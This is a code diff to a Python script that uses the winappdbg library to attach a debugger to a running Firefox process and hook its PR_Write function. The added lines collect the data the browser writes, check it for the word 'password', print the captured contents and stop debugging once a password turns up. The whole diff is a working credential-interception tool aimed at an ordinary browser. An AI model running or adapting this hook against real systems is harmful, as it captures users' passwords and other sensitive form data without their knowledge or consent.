@@ -3,9 +3,23 @@
 from winappdbg import Debug, EventHandler, System, Process
 import sys
 
+store = ''
+
 # breakout function
 def PR_Write(event, memory_address, arg1, arg2, arg3):
-    print(process.read(arg2, 1024)) # first KB of the argument (prints the memory pointer)
+    # reading til the password is found
+    global store
+    store = store + process.read(arg2, 1024)
+    # evaluating string
+    if 'password' in store:
+        print('[!] Password is Found - Debugging is stopped')
+        try:
+            # stopping the debug
+            debug.stop()
+        except Exception as e:
+            pass
+    # printing data
+    print(store)
 
 # this class specifies the module and function to intercept
 class MyEventHandler(EventHandler):
@@ -26,7 +40,7 @@ debug = Debug(MyEventHandler())
 try:
     # search for the firefox.exe process
     for (process, name) in debug.system.find_processes_by_filename("firefox.exe"):
-        print("[+] Found Firefox PID: " + process.get_pid()) # retrieve the PID
+        print("[+] Found Firefox PID: " + str(process.get_pid())) # retrieve the PID
     # attach it to the debugger
     debug.attach(process.get_pid())
     debug.loop()
